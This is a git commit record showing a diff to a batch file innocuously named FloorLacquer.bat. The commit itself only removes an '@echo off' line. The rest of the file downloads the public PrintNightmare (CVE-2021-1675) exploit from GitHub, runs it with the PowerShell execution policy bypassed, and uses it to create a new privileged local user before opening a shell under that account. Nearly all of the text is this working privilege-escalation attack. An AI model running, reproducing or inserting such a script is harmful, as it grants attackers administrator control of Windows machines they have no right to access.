b12525189d3b2bd3b1aeed193a01329fc9521301
lunarbacon <raymoo5235@students.ecpi.edu>
2025-03-22 13:58:26 -0400

    Update FloorLacquer.bat

--- FloorLacquer.bat
+++ FloorLacquer.bat
@@ -1,3 +1,2 @@
-@echo off
 curl "https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/refs/heads/main/CVE-2021-1675.ps1" -O "CVE-2021-1675.ps1"
 powershell -ExecutionPolicy Bypass -Command "$user='USER_NAME'; $pass='PASS_WORD'; Import-Module .\CVE-2021-1675.ps1; Invoke-Nightmare -NewUser $user -NewPassword $pass -DriverName asdriver; $securePass = ConvertTo-SecureString $pass -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $user, $securePass; Start-Process powershell -Credential $credential"
